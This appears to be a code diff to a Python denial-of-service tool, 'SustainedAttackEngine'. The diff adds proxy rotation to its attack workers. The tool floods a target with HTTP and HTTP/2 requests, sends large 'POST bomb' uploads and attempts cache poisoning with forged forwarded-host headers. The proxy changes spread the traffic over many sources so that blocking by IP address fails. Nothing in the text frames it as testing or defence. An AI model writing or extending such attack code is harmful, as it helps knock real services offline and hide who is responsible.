@@ -107,6 +107,7 @@ class SustainedAttackEngine:
         self.use_https = use_https
         self.vector_schedule = vector_schedule or DEFAULT_VECTOR_SCHEDULE
         self.proxies = proxies or []
+        self._proxy_idx = 0
         
         self.current_vector_idx = 0
         self.is_running = False
@@ -118,6 +119,13 @@ class SustainedAttackEngine:
             'start_time': 0,
             'current_vector': None
         }
+    
+    def _next_proxy(self) -> Optional[str]:
+        if not self.proxies:
+            return None
+        proxy = self.proxies[self._proxy_idx % len(self.proxies)]
+        self._proxy_idx += 1
+        return proxy
     
     async def start(self):
         """Start sustained attack with vector rotation."""
@@ -175,18 +183,22 @@ class SustainedAttackEngine:
     async def _http_flood(self, config: VectorConfig):
         """HTTP Flood: Normal GET requests with random query strings."""
         import aiohttp
+        from aiohttp_socks import ProxyConnector
         
         end_time = time.time() + config.duration
         tasks = []
+        proxy_list = self.proxies[:] if self.proxies else [None]
         
-        async def flood_worker():
-            connector = aiohttp.TCPConnector(ssl=False, force_close=False)
+        async def flood_worker(proxy_url):
+            if proxy_url:
+                connector = ProxyConnector.from_url(proxy_url, ssl=False, force_close=False)
+            else:
+                connector = aiohttp.TCPConnector(ssl=False, force_close=False)
             timeout = aiohttp.ClientTimeout(total=30)
             
             async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                 while time.time() < end_time and self.is_running:
                     try:
-                        # Random query string to bypass cache
                         rand_qs = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
                         url = f"{'https' if self.use_https else 'http'}://{self.target_ip}:{self.target_port}/?{rand_qs}"
                         
@@ -200,23 +212,21 @@ class SustainedAttackEngine:
                             await resp.read()
                             self.stats['total_requests'] += 1
                         
-                        # Rate limiting
                         await asyncio.sleep(1.0 / config.request_rate)
                         
                     except Exception as e:
                         self.stats['failed_requests'] += 1
                         logger.debug(f"HTTP flood error: {e}")
         
-        # Launch workers
-        for _ in range(config.connections_per_ip):
-            tasks.append(asyncio.create_task(flood_worker()))
+        for i in range(config.connections_per_ip):
+            proxy = proxy_list[i % len(proxy_list)]
+            tasks.append(asyncio.create_task(flood_worker(proxy)))
             self.stats['total_connections'] += 1
         
         await asyncio.gather(*tasks, return_exceptions=True)
     
     async def _http2_flood(self, config: VectorConfig):
         """HTTP/2 Flood: Multiplexing with parallel streams."""
-        # Simplified HTTP/2 flood using httpx
         try:
             import httpx
         except ImportError:
@@ -225,9 +235,13 @@ class SustainedAttackEngine:
             return
         
         end_time = time.time() + config.duration
+        proxy_list = self.proxies[:] if self.proxies else [None]
         
-        async def h2_worker():
-            async with httpx.AsyncClient(http2=True, verify=False) as client:
+        async def h2_worker(proxy_url):
+            client_kwargs = dict(http2=True, verify=False)
+            if proxy_url:
+                client_kwargs['proxies'] = proxy_url
+            async with httpx.AsyncClient(**client_kwargs) as client:
                 while time.time() < end_time and self.is_running:
                     try:
                         url = f"{'https' if self.use_https else 'http'}://{self.target_ip}:{self.target_port}/"
@@ -242,7 +256,7 @@ class SustainedAttackEngine:
                         self.stats['failed_requests'] += 1
                         logger.debug(f"HTTP/2 flood error: {e}")
         
-        tasks = [asyncio.create_task(h2_worker()) for _ in range(config.connections_per_ip)]
+        tasks = [asyncio.create_task(h2_worker(proxy_list[i % len(proxy_list)])) for i in range(config.connections_per_ip)]
         self.stats['total_connections'] += len(tasks)
         await asyncio.gather(*tasks, return_exceptions=True)
     
@@ -288,11 +302,16 @@ class SustainedAttackEngine:
     async def _post_bomb(self, config: VectorConfig):
         """POST Bomb: Large multipart upload."""
         import aiohttp
+        from aiohttp_socks import ProxyConnector
         
         end_time = time.time() + config.duration
+        proxy_list = self.proxies[:] if self.proxies else [None]
         
-        async def post_worker():
-            connector = aiohttp.TCPConnector(ssl=False)
+        async def post_worker(proxy_url):
+            if proxy_url:
+                connector = ProxyConnector.from_url(proxy_url, ssl=False)
+            else:
+                connector = aiohttp.TCPConnector(ssl=False)
             timeout = aiohttp.ClientTimeout(total=120)
             
             async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
@@ -300,8 +319,7 @@ class SustainedAttackEngine:
                     try:
                         url = f"{'https' if self.use_https else 'http'}://{self.target_ip}:{self.target_port}/"
                         
-                        # Generate large payload
-                        payload = 'A' * min(config.payload_size, 10 * 1024 * 1024)  # Cap at 10MB per request
+                        payload = 'A' * min(config.payload_size, 10 * 1024 * 1024)
                         
                         headers = {
                             'Host': self.target_domain,
@@ -318,7 +336,7 @@ class SustainedAttackEngine:
                         self.stats['failed_requests'] += 1
                         logger.debug(f"POST bomb error: {e}")
         
-        tasks = [asyncio.create_task(post_worker()) for _ in range(config.connections_per_ip)]
+        tasks = [asyncio.create_task(post_worker(proxy_list[i % len(proxy_list)])) for i in range(config.connections_per_ip)]
         self.stats['total_connections'] += len(tasks)
         await asyncio.gather(*tasks, return_exceptions=True)
     
@@ -365,11 +383,16 @@ class SustainedAttackEngine:
     async def _cache_poison(self, config: VectorConfig):
         """Cache Poison: X-Forwarded-Host manipulation."""
         import aiohttp
+        from aiohttp_socks import ProxyConnector
         
         end_time = time.time() + config.duration
+        proxy_list = self.proxies[:] if self.proxies else [None]
         
-        async def poison_worker():
-            connector = aiohttp.TCPConnector(ssl=False, force_close=False)
+        async def poison_worker(proxy_url):
+            if proxy_url:
+                connector = ProxyConnector.from_url(proxy_url, ssl=False, force_close=False)
+            else:
+                connector = aiohttp.TCPConnector(ssl=False, force_close=False)
             timeout = aiohttp.ClientTimeout(total=30)
             
             async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
@@ -377,7 +400,6 @@ class SustainedAttackEngine:
                     try:
                         url = f"{'https' if self.use_https else 'http'}://{self.target_ip}:{self.target_port}/"
                         
-                        # Manipulate forwarded headers
                         fake_host = f"evil-{random.randint(1000, 9999)}.com"
                         headers = {
                             'Host': self.target_domain,
@@ -396,7 +418,7 @@ class SustainedAttackEngine:
                         self.stats['failed_requests'] += 1
                         logger.debug(f"Cache poison error: {e}")
         
-        tasks = [asyncio.create_task(poison_worker()) for _ in range(config.connections_per_ip)]
+        tasks = [asyncio.create_task(poison_worker(proxy_list[i % len(proxy_list)])) for i in range(config.connections_per_ip)]
         self.stats['total_connections'] += len(tasks)
         await asyncio.gather(*tasks, return_exceptions=True)
     
